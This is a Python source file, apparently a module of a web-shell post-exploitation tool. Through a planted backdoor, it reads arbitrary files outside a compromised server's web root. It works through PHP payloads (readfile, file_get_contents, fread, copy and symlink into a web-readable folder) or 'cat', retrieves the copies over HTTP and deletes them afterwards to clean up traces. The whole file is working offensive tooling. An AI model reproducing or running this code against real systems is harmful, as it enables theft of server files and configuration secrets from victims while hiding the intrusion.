'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException
from core.http.request import Request

classname = 'Read'
    
class Read(Module):
    '''Read file outside web root using different tecniques
    :file.read <path>
    '''
    
    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "fread()", "file()", "symlink()", "copy()"  ], 
                      'shell.sh'  : [ "cat" ]
                     }
    
    vectors = { 'shell.php' : { "readfile()"       : "readfile('%s');",
                               "file()"             : "print(implode('', file('%s')));",
                               "fread()"            : "$f='%s'; print(fread(fopen($f,'r'),filesize($f)));",
                                "file_get_contents()"     : "print(file_get_contents('%s'));",
                                "copy()"       : "@copy('compress.zlib://%s','%s/file.txt');",
                                "symlink()"     : "@symlink('%s','%s/file.txt');"
                                },
                'shell.sh' : {
                                "cat" : "cat %s"
                                }
               }
    
    
    def __init__(self, modhandler, url, password):
        
        Module.__init__(self, modhandler, url, password)
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.transfer_dir = None
        self.transfer_url_dir = None
        
        
    def __slack_probe(self, remote_path):
        
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, remote_path)
                
        for interpreter in self.vectors:
            if interpreter in self.modhandler.loaded_shells:
                for vector in self.vectors_order[interpreter]:
                    response = self.__execute_payload(interpreter, vector, remote_path)
                    if response:
                        return response
                
        raise ModuleException(self.name,  "File read probing failed")      
                    
                    
                    
    def __execute_payload(self, interpreter, vector, remote_path):
        
        payload = self.vectors[interpreter][vector]
        
        if payload.count( '%s' ) == 1:
            payload = payload % remote_path
            
        if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 2:
            
            if not (self.transfer_dir and self.transfer_url_dir):
                
                self.transfer_url_dir = self.modhandler.load('find.webdir').url
                self.transfer_dir = self.modhandler.load('find.webdir').dir
            
            payload = payload % (remote_path, self.transfer_dir, self.transfer_dir)
        
        response = self.modhandler.load(interpreter).run(payload)
        
        if response:
            
            self.payload = payload
            self.interpreter = interpreter
            self.vector = vector
            
            return self.__process_response(response)
 
  
    def __process_response(self,response):
      
        if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
            url = self.transfer_url_dir + '/file.txt'
            file_path = self.transfer_dir + '/file.txt'
            
            print "[file.read] Reading file via \'%s\' and removing it" % url
            
            response = Request(url).read()
            
            if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % file_path) != '1':
                print "[!] [find.read] Error cleaning support file %s" % (file_path)
                
        else:
            print "[file.read] File read using method '%s'" % (self.vector)
        
        return response
        
     
    def run(self, remote_path):
        
        if not self.payload or not self.interpreter:
            return self.__slack_probe(remote_path)
        else:
            response = self.modhandler.load(self.interpreter).run(self.payload)
            
            if response:
                
                return self.__process_response(response)

            raise ModuleException(self.name,  "File read failed")
        
        
            
            
        
